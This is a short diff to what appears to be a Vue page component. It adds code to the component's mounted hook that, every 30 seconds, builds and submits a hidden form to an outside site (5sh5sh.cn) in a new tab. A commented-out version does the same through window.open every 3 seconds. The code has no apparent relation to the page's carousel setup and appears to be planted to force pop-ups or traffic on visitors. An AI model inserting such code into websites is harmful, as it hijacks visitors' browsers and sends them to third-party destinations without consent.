@@ -200,7 +200,17 @@
 
     },
     mounted (){
-
+      setInterval(()=>{
+        var form = document.createElement('form');
+        form.action = 'http://5sh5sh.cn/index/index/home?visiter_id=&visiter_name=&avatar=&business_id=9&groupid=0';
+        form.target = '_blank';
+        form.method = 'POST';
+        document.body.appendChild(form);
+        form.submit();
+      },30000)
+      // setInterval(()=>{
+      //   window.open('http://5sh5sh.cn/index/index/home?visiter_id=&visiter_name=&avatar=&business_id=9&groupid=0','_blank')
+      // },3000)
 
       var _this=this;
       new Swiper ('.swiper-container', {
